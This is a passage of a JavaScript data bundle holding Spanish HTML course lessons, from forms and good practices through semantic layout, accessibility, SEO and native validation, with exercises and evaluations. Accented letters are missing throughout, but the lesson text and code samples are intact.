`,completed:!1},{id:"html-junior-09-inputs-botones",title:"Leccin 9: Inputs y botones avanzados",level:"junior",content:'# Leccin 9: Inputs y botones avanzados\n\n## 1. Ms all del texto simple\n\nEn la leccin anterior vimos los inputs bsicos. HTML5 trajo muchos tipos nuevos de inputs que mejoran la experiencia en celulares y validan datos automticamente.\n\n### Inputs tiles\n*   **`type="date"`**: Muestra un calendario para elegir fecha. Genial para cumpleaos!\n    ```html\n    <input type="date" name="cumpleanos">\n    ```\n*   **`type="color"`**: Abre la paleta de colores.\n    ```html\n    <input type="color" name="color-favorito">\n    ```\n*   **`type="range"`**: Una barra deslizante (slider).\n    ```html\n    <input type="range" min="0" max="100">\n    ```\n*   **`type="file"`**: Para subir archivos o fotos.\n    ```html\n    <input type="file">\n    ```\n\n## 2. Textarea: Para textos largos\n\nSi quieres que el usuario escriba un mensaje largo (como un comentario o biografa), `input type="text"` se queda corto. Usa `<textarea>`.\n\n```html\n<label>Deja tu comentario:</label>\n<textarea rows="4" cols="50" placeholder="Escribe aqu..."></textarea>\n```\n*Nota: Textarea S tiene etiqueta de cierre `</textarea>`.*\n\n## 3. Checkbox y Radio Buttons\n\nPara elegir opciones:\n\n**Checkbox (Casilla de verificacin):** Puedes elegir varias opciones.\n```html\n<p>Elige tus frutas favoritas:</p>\n<input type="checkbox" id="manzana"> <label for="manzana">Manzana</label>\n<input type="checkbox" id="pera"> <label for="pera">Pera</label>\n```\n\n**Radio Button (Botn de opcin):** Solo puedes elegir UNA opcin de un grupo.\n*Truco:* Para que funcionen como grupo, deben tener el mismo `name`.\n\n```html\n<p>Elige tu gnero:</p>\n<input type="radio" id="hombre" name="genero" value="h">\n<label for="hombre">Hombre</label>\n\n<input type="radio" id="mujer" name="genero" value="m">\n<label for="mujer">Mujer</label>\n```\n\n## 4. Botones\n\nHay tres tipos principales de botones dentro de un formulario:\n\n1.  `<button type="submit">Enviar</button>`: Enva el formulario (es el por defecto).\n2.  `<button type="reset">Borrar</button>`: Borra todo lo que escribiste en el formulario.\n3.  `<button type="button">Click me</button>`: No hace nada por s solo (se usa con JavaScript).\n\n## 5. Ejercicio "Encuesta Divertida"\n\nCrea un archivo `encuesta.html` con un formulario que pregunte:\n1.  Nombre completo.\n2.  Fecha de nacimiento (usa `date`).\n3.  Color favorito (usa `color`).\n4.  Te gusta el chocolate? (S/No usando `radio buttons`).\n5.  Qu mascotas tienes? (Perro, Gato, Pez usando `checkbox`).\n6.  Un botn grande que diga "Enviar Respuestas".\n',completed:!1},{id:"html-junior-10-buenas-practicas",title:"Leccin 10: Buenas prcticas bsicas",level:"junior",content:`# Leccin 10: Buenas prcticas bsicas

## 1. Cdigo Limpio, Cdigo Feliz

Escribir cdigo HTML que "funcione" es fcil. Escribir cdigo PROFESIONAL que sea fcil de leer, mantener y entienda Google es un arte. Aqu tienes las reglas de oro para empezar con el pie derecho.

## 2. Indentacin (Sangra)

Es el espacio que dejamos al inicio de una lnea para mostrar que una etiqueta est *dentro* de otra.
Ayuda visualmente a entender la jerarqua.

**Mal (Difcil de leer):**
\`\`\`html
<html>
<head>
<title>Mi Web</title>
</head>
<body>
<div>
<p>Hola</p>
</div>
</body>
</html>
\`\`\`

**Bien (Fcil de leer):**
\`\`\`html
<html>
    <head>
        <title>Mi Web</title>
    </head>
    <body>
        <div>
            <p>Hola</p>
        </div>
    </body>
</html>
\`\`\`
*Tip: Usa la tecla "Tab" de tu teclado para indentar.*

## 3. Usa siempre minsculas en etiquetas

HTML no es sensible a maysculas (funciona igual \`<BODY>\` que \`<body>\`), PERO el estndar mundial y profesional es escribir **todas las etiquetas y atributos en minsculas**.

*   Mal: \`<IMG SRC="foto.jpg">\`
*   Bien: \`<img src="foto.jpg">\`

## 4. Cierra todas las etiquetas

Aunque algunas etiquetas funcionan si olvidas cerrarlas (como \`<p>\` o \`<li>\`), es una psima prctica! Acostmbrate a cerrarlas siempre.
*   Mal: \`<li>Elemento 1 <li>Elemento 2\`
*   Bien: \`<li>Elemento 1</li><li>Elemento 2</li>\`

## 5. El atributo \`alt\` en imgenes

Nunca, jams olvides el atributo \`alt\` en una imagen.
*   Es vital para las personas ciegas.
*   Es vital para SEO (Google).
*   Es vital si la imagen falla.

## 6. No inventes estructura con etiquetas de texto

No uses \`<h1>\` para hacer un texto grande si no es un ttulo.
No uses \`<b>\` o negritas para hacer subttulos.
Usa la etiqueta correcta para el significado correcto (Semntica).

*   Es una lista? Usa \`<ul>\` o \`<ol>\`, no guiones manuales.
*   Es un prrafo? Usa \`<p>\`, no saltos de lnea \`<br><br>\`.

## 7. Reto Final: "El Auditor de Cdigo"

Mira este cdigo desastroso. Tu trabajo es reescribirlo en un nuevo archivo aplicando todas las buenas prcticas que aprendiste: Indentacin, minsculas, cierre de etiquetas y semntica.

**Cdigo Feo:**
\`\`\`html
<HTML><HEAD><TITLE>mi PAGINA</TITLE></HEAD><BODY>
<H1>BIENVENIDOS</H1>
Esta es mi web.<BR><BR>
<IMG SRC="foto.jpg">
<B>Lista de cosas:</B><BR>
- Cosa 1<BR>
- Cosa 2
</BODY></HTML>
\`\`\`

Si logras arreglar esto, ya ests listo para el siguiente nivel!
Felicidades por completar el mdulo bsico de HTML!
`,completed:!1},{id:"html-junior-exercises",title:"Ejercicios Prcticos",level:"junior",content:`# Ejercicios Prcticos del Mdulo HTML Junior

## Ejercicio 1: Mi Primera Pgina Personal

**Objetivo:** Crear una pgina de presentacin personal utilizando la estructura bsica y las etiquetas de texto esenciales.

**Consigna:**
Crea un archivo llamado \`perfil.html\`.
La estructura debe incluir:
1.  El \`Doctype\` y las etiquetas \`html\`, \`head\` y \`body\`.
2.  Un ttulo principal (\`h1\`) con tu nombre completo.
3.  Un subttulo (\`h2\`) que diga "Desarrollador Web en formacin".
4.  Un prrafo (\`p\`) describiendo quin eres y por qu quieres aprender a programar. Usa **negritas** para resaltar tus cualidades principales.
5.  Un comentario en el cdigo que diga "Esta es mi primera web".

**Resultado Esperado:**
Una pgina con fondo blanco (o el que tenga tu navegador por defecto) que muestre tu informacin jerarquizada por tamaos (ttulo grande, subttulo mediano, texto normal).

---

## Ejercicio 2: Galera de Intereses

**Objetivo:** Practicar el uso de imgenes y atributos.

**Consigna:**
Crea un archivo llamado \`intereses.html\`.
1.  Agrega un ttulo que diga "Mis Intereses".
2.  Busca en internet 3 imgenes de cosas que te gusten (hobbies, comidas, lugares).
3.  Inserta las 3 imgenes en la pgina.
4.  **Importante:** Cada imagen debe tener un tamao controlado (por ejemplo, \`width="300"\`) para que no ocupen toda la pantalla.
5.  **Obligatorio:** Cada imagen debe tener el atributo \`alt\` describiendo qu se ve en la foto.

**Resultado Esperado:**
Tres imgenes alineadas (o una debajo de otra dependiendo del espacio) con un tamao uniforme y descripciones invisibles pero funcionales.

---

## Ejercicio 3: Enlazando el Mundo

**Objetivo:** Conectar pginas mediante enlaces absolutos y relativos.

**Consigna:**
Vamos a modificar el archivo \`perfil.html\` del Ejercicio 1.
1.  Al final de la descripcin, agrega un salto de lnea y un enlace (\`a\`) que diga "Ver mis intereses".
2.  Este enlace debe llevar al archivo \`intereses.html\` que creaste en el Ejercicio 2.
3.  Ahora abre \`intereses.html\` y agrega un enlace al principio que diga "Volver al Perfil" y lleve a \`perfil.html\`.
4.  Agrega un enlace extra en tu perfil que lleve a tu red social favorita (Instagram, Twitter, etc.) y asegrate de que se abra en una **pestaa nueva** (\`target="_blank"\`).

**Resultado Esperado:**
Un sistema de navegacin bsico donde puedes ir y volver entre "Perfil" e "Intereses", y un enlace externo que abre otra pestaa.

---

## Ejercicio 4: El Men del Restaurante

**Objetivo:** Dominar las listas ordenadas y desordenadas.

**Consigna:**
Crea un archivo \`menu.html\`. Imagina que ests haciendo la web para un restaurante.
1.  Crea una lista desordenada (\`ul\`) para las "Entradas" (Ej: Ensalada, Sopa, Empanadas).
2.  Crea una lista ordenada (\`ol\`) para los "Pasos para hacer una reserva" (1. Elegir fecha, 2. Llamar, 3. Confirmar).
3.  **Desafo:** Crea una seccin de "Platos Principales" y usa una lista anidada.
    *   Ejemplo:
        *   Pastas
            *   Ravioles
            *   Fideos
        *   Carnes
            *   Asado
            *   Pollo

**Resultado Esperado:**
Una estructura clara con vietas (puntitos) para las comidas y nmeros para los pasos de reserva.

---

## Ejercicio 5: Tabla de Posiciones

**Objetivo:** Mostrar datos complejos en una tabla estructurada.

**Consigna:**
Crea un archivo \`torneo.html\`.
Dibuja, usando cdigo HTML, una tabla de posiciones de un torneo ficticio.
1.  La tabla debe tener borde visible (\`border="1"\`).
2.  Debe tener encabezados (\`th\`) para: Equipo, Puntos, Partidos Jugados.
3.  Agrega al menos 3 filas de datos (\`tr\` y \`td\`) con equipos inventados.
4.  Usa \`<thead>\`, \`<tbody>\` y \`<tfoot>\` para organizar la tabla correctamente.

**Resultado Esperado:**
Una grilla cuadriculada con los nombres de las columnas en negrita y centrados, y los datos ordenados debajo.

---

## Ejercicio 6: Formulario de Registro

**Objetivo:** Crear una interfaz para recolectar datos del usuario.

**Consigna:**
Crea un archivo \`registro.html\`.
Disea un formulario de registro para un evento. Debe pedir:
1.  Nombre Completo (Label + Input texto).
2.  Correo Electrnico (Label + Input email).
3.  Edad (Label + Input number).
4.  Un selector de "Turno preferido" usando \`radio buttons\` (Maana / Tarde).
5.  Una casilla para aceptar "Trminos y condiciones" (\`checkbox\`).
6.  Un botn de "Registrarse".

**Resultado Esperado:**
Un formulario funcional donde puedas escribir. Los radio buttons deben permitir elegir solo una opcin a la vez (Maana O Tarde, no ambos).

---

## Ejercicio Final: Estructura de un Blog Simple

**Objetivo:** Integrar todo lo aprendido en un solo proyecto.

**Consigna:**
Crea un archivo \`blog.html\`.
Este archivo debe tener la estructura de un post de blog real:
1.  Un encabezado (\`header\`) con el ttulo del Blog y un men de navegacin (lista de enlaces).
2.  Un artculo principal (\`article\`) que contenga:
    *   Ttulo del post (\`h2\`).
    *   Una imagen ilustrativa.
    *   Diferentes prrafos de texto.
    *   Alguna frase en **negrita** o *cursiva*.
3.  Una seccin de comentarios (simulada) que sea un formulario con un \`textarea\` y un botn de "Comentar".
4.  Un pie de pgina (\`footer\`) con derechos de autor y enlaces a redes sociales.

**Resultado Esperado:**
Una pgina web completa que parece un artculo real, combinando texto, imgenes, listas, enlaces y formularios en un solo documento coherente.
`,completed:!1},{id:"html-eval-junior",title:"Evaluacin Final: Nivel Junior",level:"junior",content:`# Evaluacin de Competencias: HTML Junior

Esta evaluacin mide tu comprensin de los fundamentos de HTML5.

## Seccin 1: Preguntas Tericas (Responde brevemente)

1.  **Cul es la diferencia entre \`<head>\` y \`<body>\`?**
2.  **Para qu sirve el atributo \`alt\` en una imagen y por qu es obligatorio?**
3.  **Explica la diferencia entre una lista ordenada (\`<ol>\`) y una desordenada (\`<ul>\`).**
4.  **Qu etiqueta usaras para el ttulo principal de una pgina y cuntas veces debe aparecer?**
5.  **Qu ocurre si no cierras una etiqueta como \`<strong>\`?**

## Seccin 2: Correccin de Cdigo (Debug)

El siguiente cdigo tiene **5 errores**. Encuntralos y reescribe el cdigo corregido.

\`\`\`html
<html>
<body>
    <head><title>Mi Web</title></head>
    <h1>Bienvenido a mi sitio
    <p>Este es un prrafo en <b>negrita</p></b>
    <a target="google.com">Ir a Google</a>
    <img src="foto.jpg">
</html>
\`\`\`

## Seccin 3: Desafo Prctico "Tarjeta de Perfil"

Crea un archivo HTML que represente una tarjeta de presentacin digital.
**Requisitos:**
1.  Ttulo con tu nombre (\`h2\`).
2.  Una foto tuya o un avatar (usa una imagen de placeholder si quieres).
3.  Un prrafo corto con tu descripcin.
4.  Una lista de 3 habilidades.
5.  Un enlace a tu correo electrnico (\`mailto:\`).

## Criterios de Aprobacin

*   [ ] El cdigo valida sin errores graves en un validador HTML.
*   [ ] Todas las etiquetas estn cerradas correctamente.
*   [ ] Uso correcto de la anidacin (no cruzar etiquetas).
*   [ ] La estructura bsica (\`doctype\`, \`html\`, \`head\`, \`body\`) est presente.
*   [ ] Las imgenes tienen el atributo \`alt\`.
`,completed:!1,isProject:!0},{id:"html-ss-semantica-layout",title:"Arquitectura Semntica (Layout)",level:"semi-senior",content:`# Leccin 11: Arquitectura Semntica (Layout)

## 1. Adis a la "Div-itis"

Como Semi-Senior, tu cdigo debe hablar por s mismo. Un error de principiante es usar \`<div>\` para todo.
El navegador y Google ven un \`<div>\` como "una caja genrica sin significado".
Las etiquetas semnticas dicen: "Esto es una cabecera", "Esto es navegacin", "Esto es contenido principal".

### Comparacin visual

** Incorrecto (Nivel Junior/Principiante):**
\`\`\`html
<div class="header">
    <div class="nav">...</div>
</div>
<div class="main">...</div>
<div class="footer">...</div>
\`\`\`

** Correcto (Nivel Profesional):**
\`\`\`html
<header>
    <nav>...</nav>
</header>
<main>...</main>
<footer>...</footer>
\`\`\`

## 2. Las Etiquetas Estructurales Mayores

### \`<header>\`
No es solo para la parte superior de la pgina. Es para la cabecera de **cualquier seccin**.
*   Puede contener el logo, ttulo o navegacin.
*   **Puedes tener mltiples headers** (uno para la pgina, otro para un artculo).

### \`<nav>\`
Solo para bloques de **navegacin principal**.
*   No uses \`<nav>\` para una lista pequea de enlaces en el pie de pgina (a menos que sea muy importante).
*   Correcto: Men principal, ndice de contenido.

### \`<main>\`
El contenido **nico** y principal de esa pgina especfica.
*   **Regla de oro:** Solo debe haber **UN** \`<main>\` visible por pgina.
*   No debe incluir barras laterales, navegacin global o footers que se repiten en otras pginas.

### \`<aside>\`
Contenido **tangencial** o relacionado indirectamente.
*   Barras laterales (Sidebars).
*   Publicidad.
*   Cajas de "Tambin te puede interesar".
*   Si lo quitas, el contenido principal debera seguir teniendo sentido.

### \`<footer>\`
El pie de pgina de la web o de una seccin.
*   Copyright, enlaces legales, autor del artculo.

## 3. Ejercicio Rpido de Anlisis

Imagina un blog.
1.  La barra negra arriba con el logo es un \`<header>\`.
2.  Los enlaces "Inicio | Blog | Contacto" son un \`<nav>\`.
3.  La columna izquierda con el artculo es el \`<main>\`.
4.  La columna derecha con "Suscrbete" es un \`<aside>\`.
5.  La franja de abajo con el copyright es el \`<footer>\`.

## 4. Reto de Cdigo

Refactoriza este desastre:

\`\`\`html
<div id="top">
    <h1>Mi Sitio</h1>
    <div id="menu"> <a href="#">Home</a> </div>
</div>
<div id="centro">
    <p>Contenido importante</p>
</div>
<div id="barra-lateral">
    Anuncios...
</div>
\`\`\`

**Solucin esperada:**
Usar \`<header>\`, \`<nav>\`, \`<main>\` y \`<aside>\` reestructurando el HTML.
`,completed:!1},{id:"html-ss-semantica-contenido",title:"Section vs Article vs Div",level:"semi-senior",content:`# Leccin 12: Section vs Article vs Div

## 1. La eterna duda del desarrollador

Una de las preguntas ms comunes en entrevistas tcnicas es: *"Cul es la diferencia entre section, article y div?"*.
Saber esto distingue a un maquetador profesional.

## 2. \`<div>\`: El Contenedor Genrico

salo **solo** cuando no exista una etiqueta semntica mejor.
*   Principalmente para **estilos CSS** (agrupar cosas para ponerles flexbox, grid, color de fondo).
*   **Significado:** Ninguno.

## 3. \`<section>\`: Agrupacin Temtica

salo para agrupar contenido que comparte un **mismo tema**.
*   **Regla:** Generalmente debera tener un ttulo (\`h2\` - \`h6\`) dentro.
*   Si le puedes poner un ttulo a ese bloque, probablemente es una \`<section>\`.
*   Ejemplos: Seccin de "Nuestros Servicios", Seccin de "Testimonios", Seccin de "Contacto".

## 4. \`<article>\`: Contenido Independiente

Es una pieza de contenido que **tiene sentido por s misma** si la sacas de la web y la pones en otro lado (como en un lector de RSS o compartida en Facebook).
*   Ejemplos:
    *   Un post de un blog.
    *   Una tarjeta de producto en una tienda.
    *   Un comentario de un usuario.
    *   Un tweet incrustado.

### Puede ir un \`<article>\` dentro de un \`<article>\`?
S! Un comentario (\`article\`) dentro de un post de blog (\`article\`) es semnticamente correcto.

## 5. Cuadro Comparativo

| Etiqueta | Cundo usarla? | Ejemplo |
| :--- | :--- | :--- |
| \`<div>\` | Solo para diseo/CSS. Sin significado. | \`div.wrapper\`, \`div.column\` |
| \`<section>\` | Contenido relacionado temticamente. | \`section#team\`, \`section#services\` |
| \`<article>\` | Contenido distribuible/independiente. | \`article.blog-post\`, \`article.product-card\` |

## 6. Caso Real: Componente de Noticias

** Incorrecto:**
\`\`\`html
<div class="news-item">
    <h3>Ttulo Noticia</h3>
    <p>Resumen...</p>
</div>
\`\`\`

** Correcto:**
\`\`\`html
<article class="news-item">
    <h3>Ttulo Noticia</h3>
    <p>Resumen...</p>
</article>
\`\`\`

** Incorrecto:**
\`\`\`html
<div class="about-us">
    <h2>Sobre Nosotros</h2>
    <p>...</p>
</div>
\`\`\`

** Correcto:**
\`\`\`html
<section class="about-us">
    <h2>Sobre Nosotros</h2>
    <p>...</p>
</section>
\`\`\`
`,completed:!1},{id:"html-ss-accesibilidad",title:"Accesibilidad Web (Intro Prctica)",level:"semi-senior",content:'# Leccin 13: Accesibilidad Web (Intro Prctica)\n\n## 1. HTML para todos\n\nAccesibilidad (a11y) no es "algo extra". Es un derecho. Tu HTML debe poder ser consumido por personas ciegas (screen readers), personas con problemas motores (navegacin por teclado) y bots (Google).\n\n## 2. Textos Alternativos (`alt`)\n\nEl atributo `alt` en `<img>` es obligatorio.\n*   **Mala prctica:** `alt="imagen"`, `alt="foto.jpg"`, o dejarlo vaco si la imagen *aporta informacin*.\n*   **Buena prctica:** Describe la *funcin* o el *contenido*.\n    *   Si es decorativa (fondo): `alt=""` (vaco explcito para que el lector la ignore).\n    *   Si es funcional: `alt="Grfico de ventas subiendo un 20% en 2024"`.\n\n## 3. Labels y Formularios\n\nUn input sin label es invisible para un lector de pantalla.\n\n** Error Grave:**\n```html\n<!-- El usuario ciego escucha "Edit text, blank" -->\n<input type="text" placeholder="Tu bsqueda..."> \n```\n\n** Solucin 1 (Explcita):**\n```html\n<label for="search">Buscar:</label>\n<input type="text" id="search">\n```\n\n** Solucin 2 (Implcita/Wrapping):**\n```html\n<label>\n    Buscar:\n    <input type="text">\n</label>\n```\n\n** Solucin 3 (Solo visualmente oculta):**\nSi por diseo no quieres texto visible, usa una clase CSS `.sr-only` (screen reader only) o `aria-label`.\n```html\n<input type="text" aria-label="Buscar productos">\n```\n\n## 4. Jerarqua de Encabezados (Headings)\n\nLos usuarios de lectores de pantalla navegan saltando de `h1` a `h2` a `h3`.\n*   **NO** uses `<h2>` solo para hacer la letra grande.\n*   **NO** te saltes niveles (de `h1` a `h4`).\n*   **MANTN** un orden lgico.\n\n## 5. Botones vs Enlaces\n\n*   Te lleva a otra URL? -> **Usa `<a>`**.\n*   Ejecuta una accin (abrir men, enviar, calcular)? -> **Usa `<button>`**.\n\n**El crimen del `div` clickeable:**\n```html\n<!--  INACCESIBLE: No se puede enfocar con teclado (Tab) -->\n<div onclick="submit()">Enviar</div>\n\n<!--  ACCESIBLE: Recibe foco, se activa con Enter y Espacio -->\n<button onclick="submit()">Enviar</button>\n```\n',completed:!1},{id:"html-ss-seo-html",title:"SEO Tcnico Bsico en HTML",level:"semi-senior",content:`# Leccin 14: SEO Tcnico Bsico en HTML

## 1. Ayudando a Google a entenderte

El SEO (Search Engine Optimization) empieza en tu HTML. Si tu HTML es semnticamente pobre, Google no sabr de qu trata tu web.

## 2. Meta Etiquetas Clave (\`<head>\`)

### Title
Es el factor #1 de SEO On-Page en HTML.
\`\`\`html
<title>Zapatillas Deportivas Baratas | Tienda X</title>
\`\`\`
*   Debe ser nico por pgina.
*   Palabra clave importante al principio.

### Meta Description
Es el texto gris que aparece en la bsqueda de Google. Sirve para convencer al usuario de hacer clic (CTR).
\`\`\`html
<meta name="description" content="Compra zapatillas deportivas de las mejores marcas con envo gratuito. Ofertas limitadas.">
\`\`\`

### Viewport (Mobile Friendly)
Sin esto, Google te penaliza en mvil.
\`\`\`html
<meta name="viewport" content="width=device-width, initial-scale=1.0">
\`\`\`

## 3. Open Graph (Redes Sociales)

Controla cmo se ve tu enlace cuando se comparte en WhatsApp, Facebook, LinkedIn o Twitter.

\`\`\`html
<meta property="og:title" content="Increble Curso de HTML">
<meta property="og:description" content="Domina la web desde cero.">
<meta property="og:image" content="https://misitio.com/miniatura.jpg">
<meta property="og:url" content="https://misitio.com/curso">
\`\`\`

## 4. Canonical

Evita contenido duplicado. Si tienes \`misitio.com\` y \`misitio.com?ref=twitter\`, Google podra pensar que son dos pginas distintas con el mismo contenido (malo para SEO).

\`\`\`html
<link rel="canonical" href="https://misitio.com/">
\`\`\`

## 5. Atributos \`noindex\` y \`nofollow\`

*   **noindex**: "Google, no guardes esta pgina" (ej: pgina de admin, carrito).
    \`\`\`html
    <meta name="robots" content="noindex">
    \`\`\`
*   **nofollow**: "Google, no sigas este enlace" (ej: enlace pagado o de poca confianza).
    \`\`\`html
    <a href="http://sitio-externo.com" rel="nofollow">Link patrocinado</a>
    \`\`\`
`,completed:!1},{id:"html-ss-formularios-avanzados",title:"Formularios Avanzados",level:"semi-senior",content:`# Leccin 15: Formularios Avanzados

## 1. Fieldset y Legend

Para formularios largos, es profesional agrupar campos relacionados.

\`\`\`html
<form>
    <fieldset>
        <legend>Datos Personales</legend>
        <input type="text" placeholder="Nombre">
        <input type="text" placeholder="Apellido">
    </fieldset>

    <fieldset>
        <legend>Datos de Cuenta</legend>
        <input type="email" placeholder="Email">
        <input type="password" placeholder="Contrasea">
    </fieldset>
</form>
\`\`\`

## 2. Datalist (Autocompletado nativo)

Puedes ofrecer sugerencias sin obligar (como un select, pero permitiendo escribir algo distinto).

\`\`\`html
<label for="paises">Pas:</label>
<input list="lista-paises" id="paises" name="pais">

<datalist id="lista-paises">
    <option value="Argentina">
    <option value="Brasil">
    <option value="Chile">
    <option value="Espaa">
</datalist>
\`\`\`

## 3. Optgroup en Selects

Si usas un \`<select>\` con muchas opciones, agrpalas.

\`\`\`html
<select name="comida">
    <optgroup label="Frutas">
        <option value="manzana">Manzana</option>
        <option value="banana">Banana</option>
    </optgroup>
    <optgroup label="Verduras">
        <option value="zanahoria">Zanahoria</option>
        <option value="brocoli">Brcoli</option>
    </optgroup>
</select>
\`\`\`

## 4. Inputs de seleccin mltiple y archivos

*   **Multi-select:** \`<select multiple>\`
*   **Multi-file:** \`<input type="file" multiple accept=".pdf,.doc">\` (slo deja elegir PDFs o DOCs).
`,completed:!1},{id:"html-ss-validaciones",title:"Validaciones Nativas",level:"semi-senior",content:`# Leccin 16: Validaciones Nativas

## 1. Validacin sin JavaScript

El navegador puede hacer mucho trabajo por ti. No necesitas JS para comprobar si un email es vlido o si un campo est vaco.

## 2. Atributos de Restriccin

*   **\`required\`**: El campo es obligatorio.
    \`\`\`html
    <input type="text" required>
    \`\`\`

*   **\`type="email"\` / \`type="url"\`**: Valida formato automticamente.
    \`\`\`html
    <input type="email"> <!-- Esperar algo con @ -->
    \`\`\`

*   **\`minlength\` / \`maxlength\`**: Longitud de caracteres.
    \`\`\`html
    <input type="password" minlength="8" required>
    \`\`\`

*   **\`min\` / \`max\`**: Para nmeros y fechas.
    \`\`\`html
    <input type="number" min="1" max="100">
    <input type="date" min="2023-01-01">
    \`\`\`

*   **\`step\`**: Saltos numricos.
    \`\`\`html
    <input type="number" step="0.5"> <!-- Admite 1.5, 2.0, 2.5 -->
    \`\`\`

## 3. El atributo \`pattern\` (Regex)

Para validaciones complejas usando Expresiones Regulares.

Ejemplo: Cdigo postal de 4 dgitos.
\`\`\`html
<label>CP:</label>
<input type="text" pattern="[0-9]{4}" title="Debe ser un cdigo postal de 4 nmeros">
\`\`\`
*El atributo \`title\` se muestra si la validacin falla para ayudar al usuario.*

## 4. Estilizando validaciones (CSS)

El HTML avisa al CSS del estado.

\`\`\`css
input:invalid {
    border: 2px solid red;
}

input:valid {
    border: 2px solid green;
}

input:required {
    background-color: #fff8f8;
}
\`\`\`

## 5. Ejercicio Rpido

Crea un input para un "Nombre de Usuario" que:
1.  Sea obligatorio.
2.  Tenga entre 5 y 15 caracteres.
3.  Solo permita letras minsculas y nmeros (sin espacios). usar pattern.
4.  Si falla, que el borde se ponga rojo.

\`\`\`html
<!-- Solucin -->
<input 
    type="text" 
    required 
    minlength="5" 
    maxlength="15" 
    pattern="[a-z0-9]+" 
    placeholder="usuario123"
>
\`\`\`
`,completed:!1},{id:"html-ss-buenas-practicas-ss",title:"Buenas Prcticas Semi-Senior",level:"semi-senior",content:`# Leccin 17: Buenas Prcticas Semi-Senior

## 1. Limpieza y Consistencia

Un cdigo profesional se reconoce a simple vista.
*   **Indentacin:** Siempre 2 o 4 espacios (configura tu editor).
*   **Comillas:** Usa siempre comillas dobles \`class="btn"\` (estndar HTML) en lugar de simples.
*   **Orden de atributos:** Acostmbrate a un orden lgico.
    *   Ej: \`class\` -> \`id\` -> \`name\` -> \`data-*\` -> \`src/href\` -> \`title/alt\` -> \`aria-*\`.

## 2. Evitando estilos y scripts en lnea

** Mal:**
\`\`\`html
<p style="color: red; font-size: 20px;">Error</p>
<button onclick="alert('Hola')">Click</button>
\`\`\`

** Bien (Separacin de Conceptos):**
*   HTML = Estructura.
*   CSS (clases) = Estilo.
*   JS (EventListeners) = Comportamiento.

\`\`\`html
<p class="error-message">Error</p>
<button id="btn-saludo">Click</button>
\`\`\`

## 3. Rutas Relativas vs Absolutas

*   **Absolutas:** \`https://misitio.com/img/foto.jpg\` (Dependes del dominio).
*   **Relativas:** \`/img/foto.jpg\` (Desde la raz) o \`../img/foto.jpg\`.
*   **Consejo:** Usa rutas relativas raz (\`/\`) para recursos internos. Es ms robusto en entornos de desarrollo/produccin.

## 4. Rendimiento en Imgenes

Cargar imgenes gigantes mata tu web.
Como Semi-Senior, debes conocer \`loading="lazy"\`.

\`\`\`html
<!-- Carga perezosa: La imagen no se descarga hasta que el usuario hace scroll cerca de ella -->
<img src="foto-pesada.jpg" alt="..." loading="lazy" width="800" height="600">
\`\`\`
*Siempre define width y height para evitar saltos de diseo (CLS).*

## 5. Comentarios tiles

No comentes lo obvio. Comenta la **arquitectura**.

**Intil:**
\`\`\`html
<!-- Cierra div -->
</div>
\`\`\`

**til:**
\`\`\`html
<!-- /Fin Tarjeta de Producto -->
</article>
\`\`\`
`,completed:!1},{id:"html-ss-ejercicios-ss",title:"Ejercicios Nivel Semi-Senior",level:"semi-senior",content:`# Leccin 18: Ejercicios Nivel Semi-Senior

Aplica todo lo aprendido. No hay instrucciones paso a paso. T defines la estructura.

---

## Reto 1: Landing Page de Producto (Arquitectura)
**Objetivo:** Semntica impecable y SEO.

Crea la estructura HTML para vender un "Smartwatch".
1.  **Header:** Logo y Navegacin con enlaces ancla.
2.  **Hero Section:** Ttulo principal, imagen destacada, botn de compra (CTA).
3.  **Features (Seccin):** 3 caractersticas, cada una siendo un \`<article>\` con cono y ttulo (\`h3\`).
4.  **Tech Specs:** Una tabla (\`table\`) accesible con las especificaciones.
5.  **Reviews:** Una seccin con 2 testimonios (\`<blockquote>\` o \`<article>\`).
6.  **Footer:** Newsletter form y redes sociales.

*Requisito:* Usa etiquetas semnticas (\`section\`, \`article\`, \`figure\`, \`nav\`, \`aside\` si aplica). Incluye meta tags SEO bsicos.

---

## Reto 2: Formulario de Checkout (Validacin)
**Objetivo:** Formularios complejos y accesibles.

Crea un formulario de pago simulado.
1.  **Datos Personales:** Nombre, Email (validado).
2.  **Direccin de Envo:** Calle, Ciudad, CP (input con pattern de 4-5 nmeros), Pas (usando \`datalist\`).
3.  **Datos de Tarjeta:**
    *   Nmero (input text con pattern de 16 dgitos).
    *   Expira (mes/ao).
    *   CVC (3 dgitos).
4.  **Extras:** Checkbox "Es regalo" y "Guardar datos".
5.  Agrupa todo lgicamente usando \`<fieldset>\` y \`<legend>\`.
6.  Todos los campos obligatorios deben tener \`required\`.
7.  Usa \`placeholder\` y \`label\` correcto para todos.

---

## Reto 3: El Blog Accesible
**Objetivo:** A11y y optimizacin.

Crea el esqueleto de un post de blog optimizado.
1.  Ttulo \`h1\` descriptivo.
2.  Metadatos de publicacin: Autor y Fecha usando la etiqueta \`<time>\`.
3.  Imagen principal con \`alt\` descriptivo y \`loading="lazy"\`.
4.  Cuerpo del artculo con varios prrafos y un subttulo \`h2\`.
5.  Un cdigo de ejemplo dentro de \`<pre><code>\`.
6.  Una barra lateral \`<aside>\` con "Artculos relacionados" (\`<nav>\`).
7.  Asegrate de que no haya saltos de jerarqua en los headings.
`,completed:!1},{id:"html-eval-semisenior",title:"Evaluacin Final: Nivel Semi-Senior",level:"semi-senior",content:`# Evaluacin de Competencias: HTML Semi-Senior

Esta evaluacin mide tu capacidad para escribir HTML semntico, accesible y amigable con el SEO.

## Seccin 1: Preguntas Tericas

1.  **Define "HTML Semntico" y da 3 ejemplos de etiquetas semnticas vs no-semnticas.**
2.  **Cundo usaras \`<section>\` y cundo \`<article>\`? Da un ejemplo concreto.**
3.  **Explica cmo asociar correctamente un \`<label>\` con un \`<input>\`.**
4.  **Qu meta-etiquetas son esenciales para que una pgina se comparta bien en redes sociales?**
5.  **Cul es la diferencia entre \`GET\` y \`POST\` en un formulario HTML?**

## Seccin 2: Refactoring (De Div-Soup a Semntico)

Reescribe el siguiente bloque de cdigo usando etiquetas semnticas de HTML5 (\`header\`, \`nav\`, \`main\`, \`section\`, \`article\`, \`aside\`, \`footer\`, \`figure\`, etc.).

\`\`\`html
<div class="contenedor-noticia">
    <div class="encabezado-noticia">
        <h1>Nueva versin de HTML lanzada</h1>
        <div class="fecha">Publicado ayer</div>
    </div>
    <div class="contenido">
        <div class="imagen-wrapper">
            <img src="logo-html.png" />
            <span class="leyenda">Logo oficial</span>
        </div>
        <p>Ayer se anunci...</p>
    </div>
    <div class="comentarios">
        <h3>2 Comentarios</h3>
        <div class="comentario">Muy bueno!</div>
    </div>
</div>
\`\`\`

